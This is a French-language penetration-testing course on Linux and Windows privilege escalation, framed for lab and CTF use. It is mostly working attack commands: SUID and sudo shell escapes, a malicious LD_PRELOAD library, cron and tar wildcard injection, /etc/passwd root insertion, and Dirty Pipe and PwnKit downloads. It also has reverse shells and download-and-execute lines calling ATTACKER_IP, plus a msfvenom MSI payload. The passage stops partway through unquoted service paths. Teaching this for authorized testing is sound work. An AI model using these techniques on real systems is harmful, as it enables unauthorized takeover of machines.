# Privilege Escalation — Linux & Windows

La montée en privilèges (privilege escalation) est l'une des étapes centrales de tout engagement de test d'intrusion : après avoir obtenu un premier accès à faible privilège, l'objectif est d'élever ses droits jusqu'à `root` (Linux) ou `SYSTEM`/`Administrator` (Windows). Ce cours couvre les techniques les plus répandues sur les deux systèmes, avec une méthodologie structurée, des outils concrets et des exemples de code commentés.

> [!warning] Usage éthique uniquement
> Toutes les techniques présentées ici sont destinées à des environnements de laboratoire contrôlés (CTF, HTB, TryHackMe, VMs isolées). Les appliquer sur des systèmes sans autorisation explicite écrite constitue une infraction pénale dans la quasi-totalité des pays. Holberton School et les auteurs de ce cours déclinent toute responsabilité en cas d'usage malveillant.

---

## 1. Introduction et méthodologie générale

### 1.1 Qu'est-ce que la privilege escalation ?

La **privilege escalation** (PE) désigne toute technique permettant à un attaquant de passer d'un niveau de droits insuffisant à un niveau plus élevé. On distingue deux axes :

| Type | Description | Exemple |
|---|---|---|
| **Vertical** | Utilisateur normal → root/SYSTEM | `www-data` → `root` via SUID |
| **Horizontal** | Utilisateur A → Utilisateur B (même niveau) | `alice` → `bob` pour accéder à ses fichiers |

Dans ce cours, on s'intéresse principalement à la PE **verticale**.

### 1.2 Cycle de vie d'une attaque PE

```
[Accès initial]
      │
      ▼
[Énumération locale]
      │
      ├──► Mauvaises configs (SUID, sudo, cron)
      ├──► Paths/fichiers inscriptibles
      ├──► Kernel vulnérable
      ├──► Services / applications
      └──► Credentials exposés
      │
      ▼
[Exploitation]
      │
      ▼
[Shell root / SYSTEM]
      │
      ▼
[Persistance / Pivot]
```

### 1.3 Règle d'or : enumérer avant d'exploiter

> [!tip] Méthodologie
> Ne jamais sauter directement à l'exploitation. L'énumération systématique révèle souvent plusieurs vecteurs d'attaque. Choisir le plus simple et le moins bruyant en priorité.

---

# PARTIE I — Linux Privilege Escalation

---

## 2. Énumération Linux

### 2.1 Informations de base sur l'utilisateur courant

La première chose à faire après avoir obtenu un shell est de comprendre **qui on est** et **où on est**.

```bash
# Identité
id
# uid=1001(www-data) gid=1001(www-data) groups=1001(www-data),4(adm)

whoami
# www-data

# Hostname et OS
hostname
uname -a
# Linux target 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

cat /etc/os-release
cat /proc/version

# Variables d'environnement (contiennent parfois des credentials)
env
printenv

# Répertoire courant et historique
pwd
history
cat ~/.bash_history
cat ~/.zsh_history
```

### 2.2 Énumération des utilisateurs et groupes

```bash
# Tous les utilisateurs
cat /etc/passwd
# Format : user:x:uid:gid:description:home:shell
# Chercher les utilisateurs avec un shell valide (/bin/bash, /bin/sh)
cat /etc/passwd | grep -v '/nologin\|/false' | cut -d: -f1

# Groupes de l'utilisateur courant
groups
id

# Tous les groupes du système
cat /etc/group

# Utilisateurs connectés
w
who
last

# Lecture de /etc/shadow (si accessible = mauvaise config critique)
cat /etc/shadow 2>/dev/null && echo "[!] /etc/shadow lisible !"
```

### 2.3 Commandes sudo disponibles

```bash
# Lister les droits sudo de l'utilisateur courant
sudo -l

# Exemple de sortie intéressante :
# User www-data may run the following commands on target:
#     (ALL : ALL) NOPASSWD: /usr/bin/find
#     (root) NOPASSWD: /usr/bin/vim
#     (ALL) NOPASSWD: ALL      <-- jackpot absolu
```

> [!warning] Interpréter sudo -l avec soin
> `(ALL : ALL) NOPASSWD: ALL` signifie que l'utilisateur peut tout exécuter en tant que n'importe quel utilisateur sans mot de passe. C'est une escalade directe.

### 2.4 Recherche des binaires SUID et SGID

Le bit **SUID** (Set User ID) sur un exécutable signifie qu'il s'exécute avec les droits de son **propriétaire** (souvent root), quelle que soit l'identité de l'utilisateur qui le lance.

```bash
# Trouver tous les fichiers SUID
find / -perm -4000 -type f 2>/dev/null
# ou
find / -perm /4000 -type f 2>/dev/null

# Trouver tous les fichiers SGID
find / -perm -2000 -type f 2>/dev/null

# Combiné SUID + SGID
find / -perm /6000 -type f 2>/dev/null

# Afficher avec propriétaire
find / -perm -4000 -type f -ls 2>/dev/null

# Filtrer seulement ceux appartenant à root
find / -user root -perm -4000 -type f 2>/dev/null
```

**Sortie typique intéressante :**
```
-rwsr-xr-x 1 root root 44808 /usr/bin/passwd
-rwsr-xr-x 1 root root 31032 /usr/bin/find       <-- potentiellement exploitable
-rwsr-xr-x 1 root root 55504 /usr/bin/vim.basic   <-- exploitable
-rwsr-xr-x 1 root root 14328 /usr/bin/python3.8   <-- très exploitable
```

### 2.5 Fichiers et répertoires inscriptibles

```bash
# Fichiers inscriptibles par everyone dans /etc
find /etc -writable -type f 2>/dev/null

# Répertoires inscriptibles (pour PATH hijacking)
find / -writable -type d 2>/dev/null | grep -v proc

# Fichiers appartenant à l'utilisateur courant
find / -user $(whoami) -type f 2>/dev/null

# World-writable files (dangereux)
find / -perm -o+w -type f 2>/dev/null | grep -v proc | grep -v sys
```

### 2.6 Capabilities Linux

Les **capabilities** sont une division fine des privilèges root. Un binaire peut avoir `cap_setuid` sans être SUID.

```bash
# Lister les capabilities sur les fichiers
getcap -r / 2>/dev/null

# Exemple de sortie dangereuse :
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/vim = cap_dac_override+ep   <-- peut lire tout fichier
```

| Capability | Risque |
|---|---|
| `cap_setuid+ep` | Peut changer son UID → root direct |
| `cap_dac_override+ep` | Bypass contrôles d'accès aux fichiers |
| `cap_net_raw+ep` | Sniffing réseau |
| `cap_sys_admin+ep` | Proche de root, nombreuses attaques |
| `cap_sys_ptrace+ep` | Injection dans processus root |

### 2.7 Processus et services en cours

```bash
# Processus de tous les utilisateurs
ps aux
ps -ef

# Ports en écoute (services locaux inaccessibles depuis l'extérieur)
netstat -tulnp 2>/dev/null
ss -tulnp

# Connexions actives
netstat -antup 2>/dev/null

# Tâches cron (voir section dédiée)
crontab -l
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/* 2>/dev/null
```

### 2.8 Outils automatisés d'énumération

#### LinPEAS

LinPEAS est le standard de facto pour l'énumération automatisée Linux.

```bash
# Téléchargement (sur la machine attaquante)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Transfert vers la cible (méthode HTTP)
# Sur l'attaquant :
python3 -m http.server 8000

# Sur la cible :
curl http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Exécution en mémoire (sans écrire sur disque)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

> [!info] Lire la sortie de LinPEAS
> LinPEAS code les résultats par couleur :
> - **Rouge/Jaune** : vecteurs d'attaque très probables
> - **Jaune** : intéressant, à investiguer
> - **Vert** : information générale
> Commencer par les sections colorées en rouge.

#### LinEnum

```bash
# Téléchargement et exécution
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/linenum.sh
chmod +x /tmp/linenum.sh
/tmp/linenum.sh -t  # mode thorough (complet)
```

#### linux-exploit-suggester

```bash
# Suggère des kernel exploits basés sur la version détectée
curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o les.sh
bash les.sh
```

---

## 3. Exploitation des binaires SUID/SGID — GTFOBins

### 3.1 Principe GTFOBins

**GTFOBins** (https://gtfobins.github.io) est une référence qui liste les binaires Unix/Linux pouvant être abusés pour contourner des restrictions de sécurité, notamment dans le contexte SUID.

> [!info] Logique d'exploitation SUID
> Quand un binaire SUID appartenant à root exécute du code arbitraire ou ouvre un shell, ce shell hérite des droits root. L'objectif est de trouver parmi les binaires SUID ceux qui permettent d'exécuter des commandes ou des shells.

### 3.2 find avec SUID

```bash
# Vérifier que find est SUID
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root 44808 /usr/bin/find

# Exploitation : find peut exécuter des commandes via -exec
find . -exec /bin/bash -p \; -quit
# Le flag -p préserve l'EUID (effective UID = root)

# Alternative
find / -name foobar -exec /bin/sh -p \; 2>/dev/null

# Vérification
id
# uid=1001(user) gid=1001(user) euid=0(root) groups=1001(user)
```

### 3.3 vim / vi avec SUID

```bash
# Vérifier
ls -la /usr/bin/vim
# -rwsr-xr-x 1 root root 2906232 /usr/bin/vim

# Méthode 1 : via vim commande interne
vim -c ':!/bin/bash -p'
# Dans vim, appuyer sur : puis taper
:!bash -p
# ou
:set shell=/bin/bash
:shell

# Méthode 2 : lire /etc/shadow directement
vim /etc/shadow
```

### 3.4 python / python3 avec SUID ou cap_setuid

```bash
# Vérifier SUID
ls -la /usr/bin/python3
# -rwsr-xr-x 1 root root 5453504 /usr/bin/python3

# Exploitation via os.execl
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# Via setuid si capability cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Lire des fichiers sensibles
python3 -c 'print(open("/etc/shadow").read())'
```

### 3.5 bash avec SUID

```bash
# Vérifier
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1183448 /bin/bash

# Le flag -p (privileged) empêche bash de dropper les privilèges SUID
/bin/bash -p

# Vérification
id
# uid=1001(user) gid=1001(user) euid=0(root) groups=1001(user)
whoami   # affiche user mais euid=0 (root effectif)
```

### 3.6 cp, mv, nano, less, more avec SUID

```bash
# cp SUID : copier /etc/shadow ou écraser /etc/passwd
# Créer un nouveau /etc/passwd avec un utilisateur root sans mot de passe
openssl passwd -1 -salt hacker hacker123
# $1$hacker$...hash...

# Copie du passwd actuel
cp /etc/passwd /tmp/passwd.bak

# Ajout d'une ligne root bis
echo 'hacker:$1$hacker$hash_ici:0:0:root:/root:/bin/bash' >> /etc/passwd

# nano SUID : éditer directement /etc/passwd
nano /etc/passwd

# less / more SUID : exécuter un shell via le pager
# Ouvrir un fichier long, puis depuis less :
!/bin/bash -p

# nmap ancien (version 2.x-5.x) avec SUID
nmap --interactive
# nmap> !sh
```

### 3.7 Tableau récapitulatif GTFOBins SUID

| Binaire | Commande d'exploitation | Résultat |
|---|---|---|
| `find` | `find . -exec /bin/bash -p \;` | Shell root |
| `vim` | `vim -c ':!/bin/bash -p'` | Shell root |
| `python3` | `python3 -c 'import os; os.execl("/bin/bash","bash","-p")'` | Shell root |
| `bash` | `/bin/bash -p` | Shell root |
| `perl` | `perl -e 'exec "/bin/bash -p"'` | Shell root |
| `ruby` | `ruby -e 'exec "/bin/bash -p"'` | Shell root |
| `awk` | `awk 'BEGIN {system("/bin/bash -p")}'` | Shell root |
| `less` | `less /etc/passwd` puis `!/bin/bash` | Shell root |
| `nmap` (ancien) | `nmap --interactive` puis `!sh` | Shell root |
| `cp` | Écraser `/etc/passwd` | Modifier users |
| `nano` | `nano /etc/shadow` | Lire fichiers |

---

## 4. Abus de sudo

### 4.1 Comprendre /etc/sudoers

Le fichier `/etc/sudoers` définit qui peut exécuter quoi via `sudo`.

```
# Format général :
# utilisateur  hôte=(utilisateur_cible:groupe_cible) commande(s)

# Exemples :
alice    ALL=(ALL:ALL) ALL          # alice peut tout faire
bob      ALL=(root) NOPASSWD: /usr/bin/find   # bob peut lancer find en root sans mot de passe
charlie  ALL=(ALL) NOPASSWD: ALL   # charlie = root sans mot de passe
dave     web01=(www-data) /usr/bin/systemctl  # dave peut restart services sur web01
```

```bash
# Lister les règles applicables à l'utilisateur courant
sudo -l

# Exemple de sortie :
# Matching Defaults entries for www-data on target:
#     env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
#
# User www-data may run the following commands on target:
#     (ALL) NOPASSWD: /usr/bin/vim
#     (root) NOPASSWD: /usr/bin/python3
```

### 4.2 ALL=(ALL) NOPASSWD: ALL

```bash
# La configuration ultime - escalade directe
sudo /bin/bash
sudo su -
sudo -i
```

### 4.3 Exploitation de binaires spécifiques via sudo

La logique est identique à GTFOBins mais sans nécessiter SUID : `sudo <binaire>` donne les droits root au processus.

```bash
# sudo vim
sudo vim -c ':!/bin/bash'

# sudo python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'

# sudo less
sudo less /etc/passwd
# Puis depuis less : !/bin/bash

# sudo find
sudo find / -exec /bin/bash \; -quit

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo env
sudo env /bin/bash

# sudo man (ouvre dans un pager)
sudo man ls
# Puis : !/bin/bash
```

### 4.4 sudoedit — Path Traversal (CVE-2023-22809)

**sudoedit** permet l'édition de fichiers spécifiques. Une vulnérabilité historique (et récurrente) réside dans l'injection de chemin.

```bash
# Configuration vulnérable dans sudoers :
# www-data ALL=(root) NOPASSWD: sudoedit /var/www/html/*.conf

# CVE-2023-22809 (sudo < 1.9.12p2) : injection via variable d'environnement
export SUDO_EDITOR="vim -- /etc/sudoers"
sudoedit /var/www/html/test.conf
# vim s'ouvre avec /etc/sudoers comme second buffer !

# Version classique : contournement via symlink
ln -s /etc/sudoers /var/www/html/exploit.conf
sudoedit /var/www/html/exploit.conf
```

### 4.5 Injection de wildcards dans sudo

Quand une règle sudo utilise un wildcard (`*`), on peut parfois injecter des arguments.

```bash
# Règle vulnérable :
# user ALL=(root) NOPASSWD: /usr/bin/rsync *

# Exploitation : rsync peut exécuter des scripts via --rsh
sudo rsync -e 'sh -c "id && /bin/bash"' localhost:/dev/null /dev/null

# Autre exemple avec tar :
# user ALL=(root) NOPASSWD: /bin/tar *
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### 4.6 LD_PRELOAD via sudo (env_keep)

Si `env_keep += LD_PRELOAD` est dans `/etc/sudoers`, il est possible de charger une bibliothèque arbitraire.

```bash
# Vérifier si env_keep est configuré
sudo -l
# Defaults env_keep += "LD_PRELOAD"

# Créer une bibliothèque malveillante
cat << 'EOF' > /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

# Compiler en bibliothèque partagée
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# Exploitation
sudo LD_PRELOAD=/tmp/shell.so <n'importe quelle commande autorisée>
# Exemple :
sudo LD_PRELOAD=/tmp/shell.so find
```

---

## 5. Exploitation des tâches cron

### 5.1 Comprendre cron

Cron exécute des commandes selon un planning défini. Les tâches root s'exécutent avec les droits root — si on peut modifier le script ou le binaire appelé, on obtient root.

```bash
# Emplacements des fichiers cron
cat /etc/crontab           # cron système
cat /etc/cron.d/*          # snippets cron système
crontab -l                 # cron de l'utilisateur courant
ls /var/spool/cron/crontabs/   # crons de tous les utilisateurs (si accessible)
ls /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/

# Format crontab :
# minute heure jour_mois mois jour_semaine utilisateur commande
# * = n'importe quelle valeur
# */5 = toutes les 5 unités

# Exemple :
# */1 * * * * root /opt/scripts/backup.sh
# Signifie : toutes les minutes, en tant que root, exécuter /opt/scripts/backup.sh
```

### 5.2 Scripts world-writable

```bash
# Trouver les scripts exécutés par cron qui sont modifiables
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root 45 /opt/scripts/backup.sh   <-- world-writable !

# Ajouter un reverse shell ou créer un SUID bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh

# Attendre l'exécution par cron, puis :
/tmp/rootbash -p

# Alternative : reverse shell dans le script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh

# Sur l'attaquant, se mettre en écoute :
nc -lvnp 4444
```

### 5.3 PATH hijacking via cron

Si cron exécute un script sans chemin absolu ET si on contrôle un répertoire en début de `PATH` dans crontab :

```bash
# Crontab vulnérable :
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# */1 * * * * root overwrite.sh

# L'utilisateur contrôle /home/user/
# Créer un script malveillant qui sera trouvé en premier dans PATH
cat << 'EOF' > /home/user/overwrite.sh
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /home/user/overwrite.sh

# Attendre l'exécution cron, puis :
/tmp/rootbash -p
id
# euid=0(root)
```

### 5.4 Injection de wildcards tar dans cron

Un pattern classique et très connu sur HTB/CTF : un job cron qui fait `tar cf /backup/* `.

```bash
# Job cron vulnérable :
# */1 * * * * root cd /var/www && tar czf /backup/web.tar.gz *

# L'attaquant écrit dans /var/www/
# tar interprète les fichiers commençant par -- comme des flags !

cd /var/www

# Créer le payload (reverse shell)
cat << 'EOF' > /var/www/shell.sh
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /var/www/shell.sh

# Créer les "fichiers" qui sont en réalité des flags tar
touch /var/www/--checkpoint=1
touch "/var/www/--checkpoint-action=exec=sh shell.sh"

# Quand cron exécute tar avec *, les fichiers ci-dessus deviennent des arguments !
# tar czf /backup/web.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
```

> [!warning] Comprendre l'injection wildcard
> Le shell développe `*` en une liste de fichiers. Si un fichier s'appelle `--option=value`, il devient un argument de la commande. Ce comportement affecte aussi `chown`, `chmod`, `rsync`, etc.

---

## 6. Chemins inscriptibles et manipulation de l'environnement

### 6.1 /etc/passwd inscriptible

Historiquement, les mots de passe étaient stockés dans `/etc/passwd`. Un système mal configuré peut laisser ce fichier inscriptible.

```bash
# Vérifier
ls -la /etc/passwd
# -rw-rw-rw- 1 root root 1256 /etc/passwd   <-- CRITIQUE

# Option 1 : changer le mot de passe de root en vide
# (copier la ligne root et supprimer le 'x')
# root:x:0:0:root:/root:/bin/bash
# devient :
# root::0:0:root:/root:/bin/bash
cp /etc/passwd /tmp/passwd.bak
sed 's/root:x:/root::/' /etc/passwd > /tmp/newpasswd
cp /tmp/newpasswd /etc/passwd
su root   # pas de mot de passe requis

# Option 2 : ajouter un utilisateur UID 0
# Générer un hash de mot de passe
python3 -c "import crypt; print(crypt.crypt('hacker123', '\$6\$salt'))"
# $6$salt$hash_long_ici

# Ajouter la ligne
echo 'hacker:$6$salt$hash_long_ici:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # mot de passe : hacker123
```

### 6.2 LD_PRELOAD sans env_keep

Même sans `env_keep` dans sudoers, `LD_PRELOAD` peut fonctionner dans certains contextes (scripts setuid, services).

```bash
# Vérifier si un service appelle une bibliothèque
ldd /usr/sbin/service_vulnerable

# Créer une bibliothèque de remplacement malveillante
cat << 'EOF' > /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Remplace une fonction légitime
int some_function() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}

// S'exécute au chargement de la bibliothèque
void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p &");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c

# Utilisation si LD_PRELOAD est honnoré
LD_PRELOAD=/tmp/evil.so /usr/sbin/service_vulnerable
```

### 6.3 LD_LIBRARY_PATH — remplacement de bibliothèque

Si un binaire SUID cherche une bibliothèque dans un répertoire contrôlable :

```bash
# Voir les bibliothèques utilisées
ldd /usr/bin/suid_binary
# libexample.so.1 => /usr/lib/libexample.so.1

# Créer une fausse bibliothèque avec le même nom
cat << 'EOF' > /tmp/libexample.c
#include <stdlib.h>
#include <unistd.h>

// Fonction exportée que le binaire appelle
void some_exported_function() {
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/libexample.so.1 /tmp/libexample.c

# Forcer la recherche dans /tmp en premier
LD_LIBRARY_PATH=/tmp /usr/bin/suid_binary
```

> [!info] LD_PRELOAD et SUID
> Par sécurité, Linux ignore `LD_PRELOAD` et `LD_LIBRARY_PATH` pour les binaires SUID. Ces techniques fonctionnent dans les contextes sudo (avec env_keep), les scripts shell appelés par des processus root, ou les services démarrés avec des configurations d'environnement non sécurisées.

---

## 7. Exploits kernel Linux

### 7.1 Identifier la version du kernel

```bash
uname -r
# 5.4.0-90-generic

uname -a
# Linux target 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

cat /proc/version
cat /etc/os-release
lsb_release -a 2>/dev/null
```

### 7.2 Trouver des exploits kernel adaptés

```bash
# linux-exploit-suggester
bash les.sh

# Résultat typique :
# [+] [CVE-2021-4034] PwnKit
#     Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
#     Exposure: probable
#     Tags: [ ubuntu=(10|12|14|16|18|20|21).[0-9]+ ],debian=7+,...
#
# [+] [CVE-2021-3156] sudo Baron Samedit
#     Exposure: probable
#     Tags: mint=19,[ ubuntu=18|20 ], debian=10
```

### 7.3 CVE classiques importants

| CVE | Nom | Versions concernées | Type |
|---|---|---|---|
| CVE-2021-4034 | PwnKit | pkexec < 0.105 (polkit) | PE locale universelle |
| CVE-2021-3156 | Baron Samedit | sudo < 1.9.5p2 | Heap overflow sudo |
| CVE-2016-5195 | Dirty COW | kernel < 4.8.3 | Race condition kernel |
| CVE-2022-0847 | Dirty Pipe | kernel 5.8 - 5.16.11 | Overwrite fichiers read-only |
| CVE-2019-13272 | PTRACE_TRACEME | kernel < 5.1.17 | PE locale |
| CVE-2017-16995 | eBPF | kernel 4.4 - 4.14 | PE locale |

### 7.4 Dirty Pipe (CVE-2022-0847) — Exemple détaillé

Dirty Pipe permet d'écrire dans des fichiers read-only via les pipes kernel, y compris de modifier des binaires SUID.

```bash
# Vérifier la version kernel
uname -r
# 5.13.0-37-generic   <-- vulnérable (5.8 à 5.16.10)

# Télécharger le PoC
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
gcc exploit-1.c -o dirtypipe

# L'exploit modifie /etc/passwd pour mettre le hash de root vide
./dirtypipe

# Puis se connecter en root
su root   # ou selon ce que l'exploit fait

# Variant : modifier un SUID pour injecter un shell
# exploit-2.c modifie un binaire SUID pour spawner un bash root
gcc exploit-2.c -o dirtypipe2
./dirtypipe2 /usr/bin/sudo
sudo su
```

### 7.5 PwnKit (CVE-2021-4034) — Exemple détaillé

Une vulnérabilité dans `pkexec` (polkit) présente sur tous les systèmes Linux depuis 2009.

```bash
# Vérifier si pkexec est présent et sa version
which pkexec
pkexec --version
# pkexec version 0.105   <-- vulnérable si < 0.105 sur certains systèmes

# Les versions Ubuntu LTS affectées :
# Ubuntu 14.04 ESM, 16.04 ESM, 18.04 LTS, 20.04 LTS

# PoC Qualys
git clone https://github.com/ly4k/PwnKit.git
cd PwnKit
make
./PwnKit

# Alternative bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh | sh
```

> [!warning] Kernel exploits : risque de crash
> Les exploits kernel sont souvent instables et peuvent provoquer un kernel panic (crash système). Les utiliser en dernier recours, jamais sur des systèmes de production. Sur une cible CTF, préférer les techniques de configuration d'abord.

---

## 8. Services mal configurés et capabilities

### 8.1 Services exécutés en root avec fichiers modifiables

```bash
# Lister les services en cours d'exécution
systemctl list-units --type=service --state=running

# Voir les fichiers d'un service
systemctl show service_name
cat /etc/systemd/system/service_name.service

# Si ExecStart pointe vers un script modifiable :
# ExecStart=/opt/scripts/start.sh
ls -la /opt/scripts/start.sh
# Si inscriptible → modifier pour ajouter un reverse shell ou SUID bash
```

### 8.2 Exploitation de capabilities

```bash
# python3 avec cap_setuid
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep

python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl avec cap_setuid
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# vim avec cap_dac_override (bypass contrôles de fichiers)
# Peut lire /etc/shadow, modifier /etc/passwd
vim /etc/shadow

# node.js avec cap_setuid
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# ruby avec cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

---

# PARTIE II — Windows Privilege Escalation

---

## 9. Énumération Windows

### 9.1 Informations système de base

```powershell
# Informations système complètes
systeminfo

# Version Windows et build
[System.Environment]::OSVersion
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer

# Utilisateur courant
whoami
whoami /all          # SID, groupes, privilèges
whoami /priv         # Privilèges uniquement

# Utilisateurs locaux
net user
net user username    # Détail d'un utilisateur

# Groupes locaux
net localgroup
net localgroup Administrators   # Membres du groupe Admins
```

### 9.2 Énumération du réseau et des services

```powershell
# Services en cours
Get-Service | Where-Object {$_.Status -eq "Running"}
sc query              # Tous les services
tasklist /svc         # Processus avec leurs services

# Services avec chemin (important pour unquoted path)
Get-WmiObject -Class Win32_Service | Select-Object Name, PathName, StartMode, State

# Ports en écoute
netstat -ano
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# Partages réseau
net share
Get-SmbShare
```

### 9.3 Recherche de credentials et informations sensibles

```powershell
# Recherche de fichiers avec "password" dans le nom
Get-ChildItem -Path C:\ -Include *password*, *credential*, *secret* -File -Recurse -ErrorAction SilentlyContinue

# Recherche dans le contenu (lent mais efficace)
Select-String -Path C:\*.txt -Pattern "password" -ErrorAction SilentlyContinue
Select-String -Path C:\*.config -Pattern "password" -ErrorAction SilentlyContinue

# Historique PowerShell
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

# Credentials sauvegardés Windows
cmdkey /list

# Fichiers d'installation non supprimés
dir /s /b C:\unattend.xml C:\unattend\unattend.xml C:\sysprep.inf C:\sysprep\sysprep.inf C:\sysprep\sysprep.xml 2>nul

# Clés de registre contenant des mots de passe
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### 9.4 Vérification des privilèges SeImpersonatePrivilege et autres

```powershell
whoami /priv

# Privilèges intéressants pour PE :
# SeImpersonatePrivilege        → Potato attacks
# SeAssignPrimaryTokenPrivilege → PE possible
# SeDebugPrivilege              → injection dans processus SYSTEM
# SeRestorePrivilege            → modification de fichiers système
# SeTakeOwnershipPrivilege      → prendre possession de fichiers
# SeBackupPrivilege             → lire n'importe quel fichier
# SeLoadDriverPrivilege         → charger des drivers (kernel)
```

### 9.5 Outils automatisés Windows

#### WinPEAS

```powershell
# Télécharger WinPEAS depuis la machine attaquante
# Sur l'attaquant :
python3 -m http.server 8000

# Sur la cible Windows :
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/winPEASx64.exe" -OutFile "C:\Temp\winpeas.exe"
.\winpeas.exe

# Version PowerShell (sans binaire)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/winPEAS.ps1')
```

#### PowerUp

```powershell
# PowerUp : script PowerShell pour la PE Windows
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/PowerUp.ps1')
Invoke-AllChecks

# Commandes PowerUp spécifiques
Get-ServiceUnquoted           # Unquoted service paths
Get-ModifiableService         # Services avec binaires modifiables
Get-ModifiableServiceFile     # Fichiers de service modifiables
Get-ModifiableRegistryAutoRun # Registry autoruns modifiables
Get-UnattendedInstallFile     # Fichiers d'installation avec credentials
Get-Webconfig                 # Credentials dans web.config
Invoke-AllChecks              # Tout vérifier d'un coup
```

#### Seatbelt

```powershell
# Seatbelt : outil de recensement de sécurité (C#)
.\Seatbelt.exe -group=all      # Toutes les vérifications
.\Seatbelt.exe -group=user     # Spécifique à l'utilisateur
.\Seatbelt.exe TokenGroups     # Groupes et privilèges tokens
.\Seatbelt.exe CredEnum        # Credentials énumérés
```

---

## 10. AlwaysInstallElevated

### 10.1 Principe

**AlwaysInstallElevated** est une stratégie de groupe qui, lorsque activée, permet à n'importe quel utilisateur d'installer des packages MSI avec des privilèges SYSTEM. Si les deux clés de registre sont définies à 1, tout package `.msi` s'installe en SYSTEM.

### 10.2 Vérification

```powershell
# Vérifier les deux clés de registre
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Les deux doivent être à 1 pour être exploitable :
# AlwaysInstallElevated    REG_DWORD    0x1   <-- vulnérable

# Via PowerUp
Get-RegistryAlwaysInstallElevated
```

### 10.3 Exploitation

```bash
# Sur la machine attaquante (Kali), générer un MSI malveillant avec msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o /tmp/evil.msi

# Transférer sur la cible Windows
# Depuis Kali :
python3 -m http.server 8000

# Sur la cible Windows :
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/evil.msi" -OutFile "C:\Temp\evil.msi"

# Mettre un listener en écoute sur l'attaquant
nc -lvnp 4444

# Installer le MSI (s'exécute en SYSTEM)
msiexec /quiet /qn /i C:\Temp\evil.msi

# Via PowerUp (génère et installe automatiquement)
Write-UserAddMSI           # Crée un MSI qui ajoute un admin local
```

---

## 11. Unquoted Service Paths

### 11.1 Principe

Quand un service Windows a un chemin d'exécutable contenant des espaces et non entouré de guillemets, Windows teste plusieurs chemins dans l'ordre :

```
C:\Program Files\Some Service\service.exe

Windows essaie dans l'ordre :
1. C:\Program.exe
2. C:\Program Files\Some.exe
3. C:\Program Files\Some Service\service.exe
```

